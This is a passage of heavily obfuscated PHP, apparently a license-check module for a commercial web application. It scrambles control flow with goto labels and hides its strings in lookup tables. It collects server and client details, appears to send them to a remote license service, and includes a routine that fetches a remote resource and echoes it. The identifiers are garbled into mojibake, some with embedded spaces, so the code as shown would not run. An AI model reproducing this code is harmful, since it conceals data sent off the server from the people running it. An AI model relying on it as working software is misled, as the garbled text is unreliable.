Eå»ëÎœ±æ; fÒ¿â‚ù≈Ê: foreach ($e·áß©Óø∂ as $C÷¢Øº›—ë) { if (!isset($e±®∫ãÛ∂°[$C÷¢Øº›—ë]) || !$e±®∫ãÛ∂°[$C÷¢Øº›—ë]) { continue; } $fê…Ú”ı°á[$C÷¢Øº›—ë] = $e±®∫ãÛ∂°[$C÷¢Øº›—ë]; } $bºµõ—Öãç[13](array($bºµõ—Öãç[176], $bºµõ—Öãç[177]), $fê…Ú”ı°á); $D „ïÜœΩ“ = $BÈÿÑ Èÿ´[644]; goto Bù‰ÒÓÜıú; D≥„ìÒöÒù: if (strlen($f°–Ã…ÿ≤õ) < $BÈÿÑ Èÿ´[609]) { die; } $e±®∫ãÛ∂° = $bºµõ—Öãç[61]($bºµõ—Öãç[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][63]}(); $A€√„Ô›ì◊ = $BÈÿÑ Èÿ´[642]; goto B∑ƒÁÊâÉÔ; Eå»ëÎœ±æ: if ($this->uxqt49e8f951 == $bºµõ—Öãç[138]) { return; } $e·áß©Óø∂ = array($bºµõ—Öãç[178], $bºµõ—Öãç[179], $bºµõ—Öãç[180], $bºµõ—Öãç[181], $bºµõ—Öãç[182], $bºµõ—Öãç[183]); $f°–Ã…ÿ≤õ = $BÈÿÑ Èÿ´[641]; goto D≥„ìÒöÒù; Bù‰ÒÓÜıú: while (strlen($D „ïÜœΩ“) < $BÈÿÑ Èÿ´[601]) { if (!$D „ïÜœΩ“) { break; } $D „ïÜœΩ“++; } goto CŒ›É•Ú‰; B∑ƒÁÊâÉÔ: $fê…Ú”ı°á = array($bºµõ—Öãç[184] => $e±®∫ãÛ∂°[$bºµõ—Öãç[64]], $bºµõ—Öãç[185] => $e±®∫ãÛ∂°[$bºµõ—Öãç[65]], $bºµõ—Öãç[186] => $bºµõ—Öãç[10]); $c“Ë®ÀÀçÕ = $BÈÿÑ Èÿ´[643]; while (strlen($c“Ë®ÀÀçÕ) < $BÈÿÑ Èÿ´[607]) { if (!$c“Ë®ÀÀçÕ) { break; } $c“Ë®ÀÀçÕ++; } goto fÒ¿â‚ù≈Ê; CŒ›É•Ú‰: } private function tuszfa2ce229() { goto bÊÖ±™Îı–; F£Ï–¢ƒ≠ß: if ($D¨˜¨µâôà[$bø¢ﬁÉ¶ö†[204]] == $bø¢ﬁÉ¶ö†[205]) { $C…ÜõèâÕá = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][172]}($aÒÎ∞¶™⁄ö, $bø¢ﬁÉ¶ö†[206]); $cÈé¨È·µÀ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][144]}($bø¢ﬁÉ¶ö†[173]($e±◊é†˜ …), $aÒÎ∞¶™⁄ö . $bø¢ﬁÉ¶ö†[207], 3); $cÈé¨È·µÀ = $cÈé¨È·µÀ . $bø¢ﬁÉ¶ö†[208] . $_SERVER[$bø¢ﬁÉ¶ö†[198]]; $cÁêê¨ŸáØ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][209]}($bø¢ﬁÉ¶ö†[210] . $C…ÜõèâÕá . $bø¢ﬁÉ¶ö†[211] . $cÈé¨È·µÀ, -1); $bø¢ﬁÉ¶ö†[191]($cÁêê¨ŸáØ, !0); } else { if ($D¨˜¨µâôà[$bø¢ﬁÉ¶ö†[204]] == $bø¢ﬁÉ¶ö†[212]) { $F∏π√©Ê‚§ = $bø¢ﬁÉ¶ö†[25]($bø¢ﬁÉ¶ö†[131]($bø¢ﬁÉ¶ö†[213] . $aÒÎ∞¶™⁄ö), 12, 15) . $bø¢ﬁÉ¶ö†[214]; $cÈé¨È·µÀ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][215]}($bø¢ﬁÉ¶ö†[2]($D¨˜¨µâôà[$bø¢ﬁÉ¶ö†[216]]), $F∏π√©Ê‚§, 2); $dìœ·¶ÉèÇ = $bø¢ﬁÉ¶ö†[217]($cÈé¨È·µÀ, !0); if (!$bø¢ﬁÉ¶ö†[168]($dìœ·¶ÉèÇ) || !$bø¢ﬁÉ¶ö†[168]($dìœ·¶ÉèÇ[$bø¢ﬁÉ¶ö†[218]]) || $dìœ·¶ÉèÇ[$bø¢ﬁÉ¶ö†[190]] != !0) { $CÚ®≥ƒµ∆¯ = $bø¢ﬁÉ¶ö†[219]; $a›™ºåÃ◊Ù = $dìœ·¶ÉèÇ[$bø¢ﬁÉ¶ö†[218]] ? $bø¢ﬁÉ¶ö†[220] . $dìœ·¶ÉèÇ[$bø¢ﬁÉ¶ö†[218]] : $CÚ®≥ƒµ∆¯; $bø¢ﬁÉ¶ö†[191]($a›™ºåÃ◊Ù, !1); } else { $e±◊é†˜ …[$bø¢ﬁÉ¶ö†[193]] = $dìœ·¶ÉèÇ[$bø¢ﬁÉ¶ö†[218]][$bø¢ﬁÉ¶ö†[221]]; } } else { $dìœ·¶ÉèÇ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][209]}($bø¢ﬁÉ¶ö†[222], $e±◊é†˜ …, 10); $FÑﬂëÌÎ»í = $e„ëë£ÖèÙ[646]; if (strlen($FÑﬂëÌÎ»í) < $e„ëë£ÖèÙ[625]) { die; } } } if (!$bø¢ﬁÉ¶ö†[168]($dìœ·¶ÉèÇ) || !$bø¢ﬁÉ¶ö†[168]($dìœ·¶ÉèÇ[$bø¢ﬁÉ¶ö†[218]]) || $dìœ·¶ÉèÇ[$bø¢ﬁÉ¶ö†[190]] != !0) { $CÚ®≥ƒµ∆¯ = $bø¢ﬁÉ¶ö†[223]($bø¢ﬁÉ¶ö†[224]); $a›™ºåÃ◊Ù = $dìœ·¶ÉèÇ[$bø¢ﬁÉ¶ö†[218]] ? $bø¢ﬁÉ¶ö†[220] . $dìœ·¶ÉèÇ[$bø¢ﬁÉ¶ö†[218]] : $CÚ®≥ƒµ∆¯; $bø¢ﬁÉ¶ö†[191]($a›™ºåÃ◊Ù, !1); } $b®Ó–˜Ó∞… = $dìœ·¶ÉèÇ[$bø¢ﬁÉ¶ö†[218]]; goto dê£≈«—ÀÕ; cË¡≥≤Ê°≠: $DêÀ¿Èè∑Ò[$bø¢ﬁÉ¶ö†[139]] = $bø¢ﬁÉ¶ö†[240]($bø¢ﬁÉ¶ö†[135]($this->{$_SERVER[É∫„≈‹Æá¿∫Ö][172]}($a¶ı”°ΩÒ», $bø¢ﬁÉ¶ö†[241]))); $aüÃõ·ˆè† = $e„ëë£ÖèÙ[647]; while ($aüÃõ·ˆè† < $e„ëë£ÖèÙ[609]) { if ($aüÃõ·ˆè† >= 0) { break; } $aüÃõ·ˆè†++; } goto Fö±·òÜΩï; Eå‘Ñ«ä·∆: if (!isset($D¨˜¨µâôà[$bø¢ﬁÉ¶ö†[190]]) || $bø¢ﬁÉ¶ö†[24]($D¨˜¨µâôà[$bø¢ﬁÉ¶ö†[190]]) != 16) { $bø¢ﬁÉ¶ö†[191]($bø¢ﬁÉ¶ö†[192] . $D¨˜¨µâôà[$bø¢ﬁÉ¶ö†[190]], !1); } $CÂÚ‘À¡ ç = $bø¢ﬁÉ¶ö†[61]($bø¢ﬁÉ¶ö†[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][63]}($bø¢ﬁÉ¶ö†[133]); $aÒÎ∞¶™⁄ö = $bø¢ﬁÉ¶ö†[131]($_SERVER[$bø¢ﬁÉ¶ö†[132]] . $CÂÚ‘À¡ ç); goto d‹åîûëÆ‡; FÒÏõ¡ ™Ì: $a„‹‹„≠Éè = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][144]}($bø¢ﬁÉ¶ö†[173]($b®Ó–˜Ó∞…), $BÀ»¯õ•å¨); $Eò€Â∫ì≈ï = $bø¢ﬁÉ¶ö†[248]($bø¢ﬁÉ¶ö†[61]($bø¢ﬁÉ¶ö†[11])->{$_SERVER[É∫„≈‹Æá¿∫Ö][249]}(), $bø¢ﬁÉ¶ö†[250]); $Eé∏◊óíñ´ = $Eò€Â∫ì≈ï[$bø¢ﬁÉ¶ö†[251]]; goto cΩ˜´ú„Üÿ; DÊœçöûıÂ: if (!$B¿√ö¶ÀÓç) { die; } $DêÀ¿Èè∑Ò[$bø¢ﬁÉ¶ö†[140]] = $bø¢ﬁÉ¶ö†[135]($bø¢ﬁÉ¶ö†[240]($this->{$_SERVER[É∫„≈‹Æá¿∫Ö][172]}($E¢Í∑ÂöïÜ, $bø¢ﬁÉ¶ö†[242]))); if ($b®Ó–˜Ó∞…[$bø¢ﬁÉ¶ö†[243]] && $b®Ó–˜Ó∞…[$bø¢ﬁÉ¶ö†[243]] >= 1) { $bø¢ﬁÉ¶ö†[61]($bø¢ﬁÉ¶ö†[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][244]}($bø¢ﬁÉ¶ö†[245], $bø¢ﬁÉ¶ö†[246]); } goto B†ùﬂÓòÃ⁄; Fö±·òÜΩï: $aÈïªΩÿ§œ = $bø¢ﬁÉ¶ö†[141](16); $E¢Í∑ÂöïÜ = $aÈïªΩÿ§œ . $DêÀ¿Èè∑Ò[$bø¢ﬁÉ¶ö†[137]] . $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][172]}($bø¢ﬁÉ¶ö†[131]($DêÀ¿Èè∑Ò[$bø¢ﬁÉ¶ö†[234]]), $aÈïªΩÿ§œ); $B¿√ö¶ÀÓç = $e„ëë£ÖèÙ[648]; goto DÊœçöûıÂ; b©ÂïèáÚª: if (!$bø¢ﬁÉ¶ö†[123]($GLOBALS, $bø¢ﬁÉ¶ö†[149])) { die; } $D¨˜¨µâôà = $GLOBALS[$bø¢ﬁÉ¶ö†[22]]; if (isset($D¨˜¨µâôà[$bø¢ﬁÉ¶ö†[188]])) { $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][189]}(); die; } goto Eå‘Ñ«ä·∆; cΩ˜´ú„Üÿ: $bÎËÃŸü≤∞ = array(); $bÎËÃŸü≤∞[$Bç¥∑èíãô] = $a„‹‹„≠Éè; $bø¢ﬁÉ¶ö†[61]($bø¢ﬁÉ¶ö†[11])->{$_SERVER[É∫„≈‹Æá¿∫Ö][252]}($Eé∏◊óíñ´[$bø¢ﬁÉ¶ö†[253]], array($bø¢ﬁÉ¶ö†[254] => $bÎËÃŸü≤∞)); goto eƒÍ∆ıï¿Í; eƒÍ∆ıï¿Í: $båÒã’‰≠á = $e„ëë£ÖèÙ[651]; if (strlen($båÒã’‰≠á) < $e„ëë£ÖèÙ[609]) { return; } $this->mflrf2bde457 = $b®Ó–˜Ó∞…; goto AôÎ¶∆ﬁ‹¡; F∞‘Œ¶…Íû: $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][255]}(); $b«‹Îùı®î = $e„ëë£ÖèÙ[653]; if (!$b«‹Îùı®î) { die; } goto Dﬁ¨‰ÛÌ∑; d‹åîûëÆ‡: $e±◊é†˜ … = array($bø¢ﬁÉ¶ö†[190] => $D¨˜¨µâôà[$bø¢ﬁÉ¶ö†[190]], $bø¢ﬁÉ¶ö†[193] => $bø¢ﬁÉ¶ö†[141](16), $bø¢ﬁÉ¶ö†[194] => $bø¢ﬁÉ¶ö†[174], $bø¢ﬁÉ¶ö†[195] => $bø¢ﬁÉ¶ö†[196], $bø¢ﬁÉ¶ö†[197] => $_SERVER[$bø¢ﬁÉ¶ö†[198]], $bø¢ﬁÉ¶ö†[199] => $_SERVER[$bø¢ﬁÉ¶ö†[200]], $bø¢ﬁÉ¶ö†[201] => $_SERVER[$bø¢ﬁÉ¶ö†[202]], $bø¢ﬁÉ¶ö†[130] => $aÒÎ∞¶™⁄ö, $bø¢ﬁÉ¶ö†[203] => $bø¢ﬁÉ¶ö†[61]($bø¢ﬁÉ¶ö†[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][63]}($bø¢ﬁÉ¶ö†[164])); $Dê∏êé†¬ = $e„ëë£ÖèÙ[645]; if (strlen($Dê∏êé†¬) < $e„ëë£ÖèÙ[625]) { die; } goto F£Ï–¢ƒ≠ß; dê£≈«—ÀÕ: $e”∏é°›ìÀ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][225]}($b®Ó–˜Ó∞…[$bø¢ﬁÉ¶ö†[226]]); if (!$e”∏é°›ìÀ || $e”∏é°›ìÀ != $b®Ó–˜Ó∞…[$bø¢ﬁÉ¶ö†[162]]) { $C–÷àΩëµÜ = array($bø¢ﬁÉ¶ö†[227] => $bø¢ﬁÉ¶ö†[61]($bø¢ﬁÉ¶ö†[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][63]}($bø¢ﬁÉ¶ö†[133]), $bø¢ﬁÉ¶ö†[228] => $_SERVER[$bø¢ﬁÉ¶ö†[132]], $bø¢ﬁÉ¶ö†[229] => $bø¢ﬁÉ¶ö†[230](), $bø¢ﬁÉ¶ö†[199] => $_SERVER[$bø¢ﬁÉ¶ö†[200]]); $cÈé¨È·µÀ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][231]}($bø¢ﬁÉ¶ö†[173]($C–÷àΩëµÜ)); $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][209]}($bø¢ﬁÉ¶ö†[232] . $cÈé¨È·µÀ); $bø¢ﬁÉ¶ö†[191]($bø¢ﬁÉ¶ö†[223]($bø¢ﬁÉ¶ö†[233]), !0); } $DêÀ¿Èè∑Ò = array($bø¢ﬁÉ¶ö†[234] => $b®Ó–˜Ó∞…[$bø¢ﬁÉ¶ö†[235]], $bø¢ﬁÉ¶ö†[236] => $b®Ó–˜Ó∞…[$bø¢ﬁÉ¶ö†[237]], $bø¢ﬁÉ¶ö†[238] => $bø¢ﬁÉ¶ö†[141](16), $bø¢ﬁÉ¶ö†[137] => $b®Ó–˜Ó∞…[$bø¢ﬁÉ¶ö†[239]]); goto c¥Ñıº¬¿”; Dﬁ¨‰ÛÌ∑: Cache::set($bø¢ﬁÉ¶ö†[256] . $bø¢ﬁÉ¶ö†[131]($CÂÚ‘À¡ ç . $bø¢ﬁÉ¶ö†[257]), $bø¢ﬁÉ¶ö†[10]); $EíôÿØú∂é = $e„ëë£ÖèÙ[654]; $bø¢ﬁÉ¶ö†[191]($bø¢ﬁÉ¶ö†[223]($bø¢ﬁÉ¶ö†[233]), !0); goto D—∞Ÿ∞∑˜≤; c¥Ñıº¬¿”: if ($e±◊é†˜ …[$bø¢ﬁÉ¶ö†[193]]) { $DêÀ¿Èè∑Ò[$bø¢ﬁÉ¶ö†[238]] = $e±◊é†˜ …[$bø¢ﬁÉ¶ö†[193]]; } $CÖº°µâ’é = $bø¢ﬁÉ¶ö†[25]($bø¢ﬁÉ¶ö†[131]($DêÀ¿Èè∑Ò[$bø¢ﬁÉ¶ö†[236]]), 10, 10); $a¶ı”°ΩÒ» = $CÖº°µâ’é . $DêÀ¿Èè∑Ò[$bø¢ﬁÉ¶ö†[137]] . $DêÀ¿Èè∑Ò[$bø¢ﬁÉ¶ö†[238]]; goto cË¡≥≤Ê°≠; E”ç±™ø˘: $Bç¥∑èíãô = $bø¢ﬁÉ¶ö†[240]($bø¢ﬁÉ¶ö†[25]($BÀ»¯õ•å¨, 10, 16)); $BÉùò™µ◊⁄ = $e„ëë£ÖèÙ[650]; if (strlen($BÉùò™µ◊⁄) < $e„ëë£ÖèÙ[609]) { die; } goto FÒÏõ¡ ™Ì; B†ùﬂÓòÃ⁄: $bø¢ﬁÉ¶ö†[61]($bø¢ﬁÉ¶ö†[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][247]}($DêÀ¿Èè∑Ò); $BÀ»¯õ•å¨ = $bø¢ﬁÉ¶ö†[131]($_SERVER[$bø¢ﬁÉ¶ö†[132]] . $bø¢ﬁÉ¶ö†[240]($CÂÚ‘À¡ ç) . $DêÀ¿Èè∑Ò[$bø¢ﬁÉ¶ö†[236]]); $dãö∞‹∆‹Ù = $e„ëë£ÖèÙ[649]; goto E”ç±™ø˘; bÊÖ±™Îı–: $e„ëë£ÖèÙ =& $_SERVER[’ÿƒ†ïò]; $bø¢ﬁÉ¶ö† =& $_SERVER[É∫„≈‹Æá¿∫Ö]; if ($_SERVER[$bø¢ﬁÉ¶ö†[44]] != $bø¢ﬁÉ¶ö†[187]) { return; } goto b©ÂïèáÚª; AôÎ¶∆ﬁ‹¡: $this->uxqt49e8f951 = $DêÀ¿Èè∑Ò[$bø¢ﬁÉ¶ö†[137]]; $b·ãÖ¨áŸæ = $e„ëë£ÖèÙ[652]; while (strlen($b·ãÖ¨áŸæ) < $e„ëë£ÖèÙ[607]) { if (!$b·ãÖ¨áŸæ) { break; } $b·ãÖ¨áŸæ++; } goto F∞‘Œ¶…Íû; D—∞Ÿ∞∑˜≤: } private function licenseRegistSuccess() { $Dßª›†èâ« =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $cç…‘’πà  = $Dßª›†èâ«[61]($Dßª›†èâ«[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][63]}(); if ($cç…‘’πà [$Dßª›†èâ«[93]] != $Dßª›†èâ«[246]) { $Dßª›†èâ«[61]($Dßª›†èâ«[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][247]}($Dßª›†èâ«[93], $Dßª›†èâ«[246]); } $Dßª›†èâ«[127]($Dßª›†èâ«[258])->{$_SERVER[É∫„≈‹Æá¿∫Ö][259]}(!0); } private function bqag4b1e66d8() { goto CË‘’Á ∫∂; e–Ú¢®Ã≤À: $c¢ùßå„ë˜ = $c–ŸÂ≤≈É∆[655]; $f”ˆô¢ÿÁó[61]($f”ˆô¢ÿÁó[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][244]}($f”ˆô¢ÿÁó[245], $f”ˆô¢ÿÁó[260]); $FÌ‡·ä¢„∂ = $c–ŸÂ≤≈É∆[656]; goto EµÛı◊Êñ; EµÛı◊Êñ: if (strlen($FÌ‡·ä¢„∂) < $c–ŸÂ≤≈É∆[609]) { die; } $this->mflrf2bde457 = array(); $aöøΩÓ◊∞¨ = $c–ŸÂ≤≈É∆[657]; goto fπëÒÑ¥áí; fπëÒÑ¥áí: if (!$aöøΩÓ◊∞¨) { return; } $this->uxqt49e8f951 = $f”ˆô¢ÿÁó[138]; goto FåçìÈ°ó; CË‘’Á ∫∂: $c–ŸÂ≤≈É∆ =& $_SERVER[’ÿƒ†ïò]; $f”ˆô¢ÿÁó =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $f”ˆô¢ÿÁó[61]($f”ˆô¢ÿÁó[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][247]}(array($f”ˆô¢ÿÁó[234] => $f”ˆô¢ÿÁó[10], $f”ˆô¢ÿÁó[236] => $f”ˆô¢ÿÁó[10], $f”ˆô¢ÿÁó[137] => $f”ˆô¢ÿÁó[138], $f”ˆô¢ÿÁó[139] => $f”ˆô¢ÿÁó[10], $f”ˆô¢ÿÁó[140] => $f”ˆô¢ÿÁó[10])); goto e–Ú¢®Ã≤À; FåçìÈ°ó: } private function xrnf16402a1e() { goto eŒ‚◊ÙÊÒ§; aÑûÏø¬Û®: $this->mflrf2bde457 = $EÂÆ≈ÍÿÆ»; $this->uxqt49e8f951 = $c·´€è–Œœ[$BπÌ∏¨¨à≈[137]]; goto B‚ÆœïÛ¯Ü; dµÎ”âÕ·∆: if (!$c◊ÇÑÿŸâæ) { return; } $eÃë§ÑÂŒÖ = $BπÌ∏¨¨à≈[256] . $BπÌ∏¨¨à≈[131]($DµΩ÷ß≥‹í . $BπÌ∏¨¨à≈[257]); $d‰Â“Ú°üì = $e≤±√ü∑€Ç[660]; goto Fˆ≥µÙÔ€¿; Fˆ≥µÙÔ€¿: $EÂÆ≈ÍÿÆ» = Cache::get($eÃë§ÑÂŒÖ); if (!$BπÌ∏¨¨à≈[168]($EÂÆ≈ÍÿÆ») || !isset($EÂÆ≈ÍÿÆ»[$BπÌ∏¨¨à≈[261]]) || $BπÌ∏¨¨à≈[262]() - $EÂÆ≈ÍÿÆ»[$BπÌ∏¨¨à≈[261]] >= 60) { $F Æòñ‘ó¿ = $BπÌ∏¨¨à≈[61]($BπÌ∏¨¨à≈[11])->{$_SERVER[É∫„≈‹Æá¿∫Ö][263]}(); $Eâï“‡ñí÷ = $F Æòñ‘ó¿[$BπÌ∏¨¨à≈[251]]; $cä—Í±◊ƒ‡ = $BπÌ∏¨¨à≈[131]($_SERVER[$BπÌ∏¨¨à≈[132]] . $BπÌ∏¨¨à≈[240]($DµΩ÷ß≥‹í) . $c·´€è–Œœ[$BπÌ∏¨¨à≈[236]]); $cïåäÓ»•£ = $BπÌ∏¨¨à≈[240]($BπÌ∏¨¨à≈[25]($cä—Í±◊ƒ‡, 10, 16)); $EÂÆ≈ÍÿÆ» = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][215]}($Eâï“‡ñí÷[$BπÌ∏¨¨à≈[111]][$cïåäÓ»•£], $cä—Í±◊ƒ‡); $EÂÆ≈ÍÿÆ» = $BπÌ∏¨¨à≈[217]($EÂÆ≈ÍÿÆ», !0); } if (!$BπÌ∏¨¨à≈[168]($EÂÆ≈ÍÿÆ»)) { return $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][189]}(); } goto D¬é∫”¡Ü™; eŒ‚◊ÙÊÒ§: $e≤±√ü∑€Ç =& $_SERVER[’ÿƒ†ïò]; $BπÌ∏¨¨à≈ =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $_SERVER[$BπÌ∏¨¨à≈[200]] = $BπÌ∏¨¨à≈[123]($_SERVER, $BπÌ∏¨¨à≈[200], APP_HOST); goto dª∞±ØΩü…; D¬é∫”¡Ü™: $aû…èÎÔå“ = $BπÌ∏¨¨à≈[161]($EÂÆ≈ÍÿÆ»[$BπÌ∏¨¨à≈[162]]); if ($BπÌ∏¨¨à≈[262]() >= $aû…èÎÔå“) { return $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][189]}(); } if ($BπÌ∏¨¨à≈[262]() - $EÂÆ≈ÍÿÆ»[$BπÌ∏¨¨à≈[261]] > 20) { $EÂÆ≈ÍÿÆ»[$BπÌ∏¨¨à≈[261]] = $BπÌ∏¨¨à≈[262](); Cache::set($eÃë§ÑÂŒÖ, $EÂÆ≈ÍÿÆ»); } goto aÑûÏø¬Û®; B…–ë§¨ÉË: if ($c·´€è–Œœ[$BπÌ∏¨¨à≈[137]] == $BπÌ∏¨¨à≈[138]) { return; } $DµΩ÷ß≥‹í = $BπÌ∏¨¨à≈[61]($BπÌ∏¨¨à≈[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][63]}($BπÌ∏¨¨à≈[133]); $c◊ÇÑÿŸâæ = $e≤±√ü∑€Ç[659]; goto dµÎ”âÕ·∆; dª∞±ØΩü…: $this->uxqt49e8f951 = $BπÌ∏¨¨à≈[138]; $CÎÜ¬ù®ª∞ = $e≤±√ü∑€Ç[658]; $c·´€è–Œœ = $BπÌ∏¨¨à≈[61]($BπÌ∏¨¨à≈[62])->{$_SERVER[É∫„≈‹Æá¿∫Ö][63]}(); goto B…–ë§¨ÉË; B‚ÆœïÛ¯Ü: } private function sdvyd360d725() { $Eô⁄Ÿß∞≈Í =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $fªﬂ≤¨Éïê = $GLOBALS[$Eô⁄Ÿß∞≈Í[22]]; $eƒëç⁄Ïõ´ = $_SERVER[$Eô⁄Ÿß∞≈Í[44]]; if ($eƒëç⁄Ïõ´ == $Eô⁄Ÿß∞≈Í[264] && $this->uxqt49e8f951 == $Eô⁄Ÿß∞≈Í[138]) { $Eô⁄Ÿß∞≈Í[191]($Eô⁄Ÿß∞≈Í[223]($Eô⁄Ÿß∞≈Í[265]), !1, $Eô⁄Ÿß∞≈Í[266]); } $C‰ÛäÙ≈·® = array($Eô⁄Ÿß∞≈Í[267], $Eô⁄Ÿß∞≈Í[268]); if ($Eô⁄Ÿß∞≈Í[269]($eƒëç⁄Ïõ´, $C‰ÛäÙ≈·®)) { if ($this->uxqt49e8f951 == $Eô⁄Ÿß∞≈Í[138] && isset($fªﬂ≤¨Éïê[$Eô⁄Ÿß∞≈Í[270]])) { $Eô⁄Ÿß∞≈Í[191]($Eô⁄Ÿß∞≈Í[223]($Eô⁄Ÿß∞≈Í[265]), !1, $Eô⁄Ÿß∞≈Í[266]); die; } $cöõ…–œŒé = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][154]}(); if ($cöõ…–œŒé != $Eô⁄Ÿß∞≈Í[271]($Eô⁄Ÿß∞≈Í[272])) { if ($cöõ…–œŒé <= $Eô⁄Ÿß∞≈Í[61]($Eô⁄Ÿß∞≈Í[156])->{$_SERVER[É∫„≈‹Æá¿∫Ö][157]}()) { $Eô⁄Ÿß∞≈Í[191]($Eô⁄Ÿß∞≈Í[223]($Eô⁄Ÿß∞≈Í[273]), !1, $Eô⁄Ÿß∞≈Í[266]); die; } } } } private function jvpi4fbb4823() { goto A±ä®Ö‚èÙ; FÑæåîûâÁ: if (!$aãƒ‹†î√†) { die; } if ($dÍΩç∞§∂‘ && $A∂–ΩûÃ–ò[32]($dÍΩç∞§∂‘, $A∂–ΩûÃ–ò[287])) { echo $dÍΩç∞§∂‘; } die; goto EàÁÓÕÉçó; b¬öä±˜›â: if (!$BˆÀæÑ™’⁄) { return; } $A∂–ΩûÃ–ò[285]($A∂–ΩûÃ–ò[286]); $aãƒ‹†î√† = $AÏôêåæáñ[663]; goto FÑæåîûâÁ; A±ä®Ö‚èÙ: $AÏôêåæáñ =& $_SERVER[’ÿƒ†ïò]; $A∂–ΩûÃ–ò =& $_SERVER[É∫„≈‹Æá¿∫Ö]; $f∫’ËäÑÈõ = array($A∂–ΩûÃ–ò[152], $A∂–ΩûÃ–ò[274]); goto dÛ«Úû≈¶◊; dÛ«Úû≈¶◊: $DÙí¯ûø”à = $AÏôêåæáñ[661]; if (!$DÙí¯ûø”à) { die; } if (!$A∂–ΩûÃ–ò[123]($GLOBALS, $A∂–ΩûÃ–ò[149]) || !isset($_GET[$A∂–ΩûÃ–ò[275]])) { return; } goto D¬‹ı™Çìù; D¬‹ı™Çìù: if (!$A∂–ΩûÃ–ò[269]($_SERVER[$A∂–ΩûÃ–ò[44]], $f∫’ËäÑÈõ)) { return; } $eÉ≈È∑Ùÿ√ = $A∂–ΩûÃ–ò[276]; $eÉ≈È∑Ùÿ√ = $this->{$_SERVER[É∫„≈‹Æá¿∫Ö][277]}($eÉ≈È∑Ùÿ√, $A∂–ΩûÃ–ò[278]); goto fé˜ãçŒ’Í; fé˜ãçŒ’Í: $dﬂúîéìÇë = $A∂–ΩûÃ–ò[279](array($A∂–ΩûÃ–ò[280] => array($A∂–ΩûÃ–ò[281] => $A∂–ΩûÃ–ò[282], $A∂–ΩûÃ–ò[283] => 3))); $dÍΩç∞§∂‘ = @$A∂–ΩûÃ–ò[284]($eÉ≈È∑Ùÿ√, !1, $dﬂúîéìÇë); $BˆÀæÑ™’⁄ = $AÏôêåæáñ[662]; goto b¬öä±˜›â; EàÁÓÕÉçó: } public function gjqa6a5d23d5($Dú—øÍÍ”û) { goto Bâﬁ“ã„Óü; e∑«˜ëÆìÆ: $aﬂ›Ø·µ…‚ = array(); foreach ($c‡º˘∑•Í± as $AöÂÑô§èä => $CÊÔÖöªäÀ) { if ($CÊÔÖöªäÀ == $DÆ£“Îáêç[290] && $DÆ£“Îáêç[25]($this->uxqt49e8f951, 0, 1) == $DÆ£“Îáêç[290]) { continue; } if (!$DÆ£“Îáêç[269]($AöÂÑô§èä, $Aâõ‰üŸÇ»)) { $aﬂ›Ø·µ…‚[] = $AöÂÑô§èä; } } foreach ($aﬂ›Ø·µ…‚ as $AöÂÑô§èä) { unset($Dú—øÍÍ”û[$AöÂÑô§èä]); $AÖ¶∑îËßì = $eπ≈æÎå‰Ï[665]; if (strlen($AÖ¶∑îËßì) < $eπ≈æÎå‰Ï[601]) { die; } } goto eûŸˆÆ∞ﬁ≈; b∑´ΩÑŒ¥Ω: $c‡º˘∑•Í± = array($DÆ£“Îáêç[289] => $DÆ£“Îáêç[290], $DÆ£“Îáêç[291] => $DÆ£“Îáêç[290], $DÆ£“Îáêç[292] => $DÆ£“Îáêç[290], $DÆ£“Îáêç[293] => $DÆ£“Îáêç[290], $DÆ£“Îáêç[294] => $DÆ£“Îáêç[295], $DÆ£“Îáêç[296] => $DÆ£“Îáêç[295], $DÆ£“Îáêç[297] => $DÆ£“Îáêç[295], $DÆ£“Îáêç[298] => $DÆ£“Îáêç[295], $DÆ£“Îáêç[299] => $DÆ£“Îáêç[295], $DÆ£“Îáêç[300] => $DÆ£“Îáêç[295], $DÆ£“Îáêç[301] => $DÆ£“Îáêç[295], $DÆ£“Îáêç[302] => $DÆ£“Îáêç[295], $DÆ£“Îáêç[303] => $DÆ£“Îáêç[295], $DÆ£“Îáêç[304] => $DÆ£“Îáêç[295], $DÆ£“Îáêç[305] => $DÆ£“Îáêç[295], $DÆ£“Îáêç[306] => $DÆ£“Îáêç[295]); $Aâõ‰üŸÇ» = $DÆ£“Îáêç[0]($DÆ£“Îáêç[307], $DÆ£“Îáêç[123]($this->mflrf2bde457, $DÆ£“Îáêç[146], $DÆ£“Îáêç[10])); $C‡Ÿç•§ëï = $eπ≈æÎå‰Ï[664]; goto e∑«˜ëÆìÆ; eûŸˆÆ∞ﬁ≈: return $Dú—øÍÍ”û; $eÑ≤‹ÙõØê = $eπ≈æÎå‰Ï[666]; if (strlen($eÑ≤‹ÙõØê) < $eπ≈æÎå‰Ï[601]) { return; } goto F·«÷ñëÿÌ; Bâﬁ“ã„Óü: $eπ≈æÎå‰Ï =& $_SERVER[’ÿƒ†ïò]; $DÆ£“Îáêç =& $_SERVER[É∫„≈‹Æá¿∫Ö]; if ($this->uxqt49e8f951 == $DÆ£“Îáêç[288]) { return $Dú—øÍÍ”û; 